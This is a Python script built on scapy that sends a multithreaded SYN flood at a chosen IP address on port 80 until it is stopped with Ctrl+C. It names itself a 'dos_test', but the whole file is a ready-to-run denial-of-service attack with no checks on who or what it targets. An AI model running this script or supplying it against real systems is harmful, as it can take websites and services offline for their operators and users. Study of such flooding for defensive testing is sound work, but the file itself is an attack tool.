import sys
import threading
from scapy.all import IP, TCP, send, RandShort

def syn_flood(target_ip, target_port, stop_event):
    """
    Crafts and sends SYN packets in a loop until the stop event is set.
    """
    while not stop_event.is_set():
        try:
            # Craft the packet with a random source port
            packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
            # Send the packet without printing output for each one
            send(packet, verbose=0)
        except Exception:
            # Suppress errors if the network interface is busy
            pass

def main():
    """
    Main function to parse arguments and launch the attack threads.
    """
    if len(sys.argv) != 3:
        print("Usage: python dos_test.py <Target_IP> <Thread_Count>")
        print("Example: python dos_test.py 192.168.29.59 50")
        sys.exit(1)

    try:
        target_ip = sys.argv[1]
        thread_count = int(sys.argv[2])
        target_port = 80  # We will target the common web port 80
    except ValueError:
        print("Error: Thread Count must be an integer.")
        sys.exit(1)

    print(f"[*] Starting SYN flood on {target_ip}:{target_port} with {thread_count} threads.")
    print("[*] Attack running. Press Ctrl+C to stop.")

    threads = []
    stop_event = threading.Event()

    for i in range(thread_count):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, stop_event))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    try:
        # Keep the main thread alive to let the attack run
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping attack threads...")
        stop_event.set()
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=1.0)
        print("[+] Attack stopped.")
        sys.exit(0)

if __name__ == "__main__":
    # We need to import time for the sleep function
    import time
    main()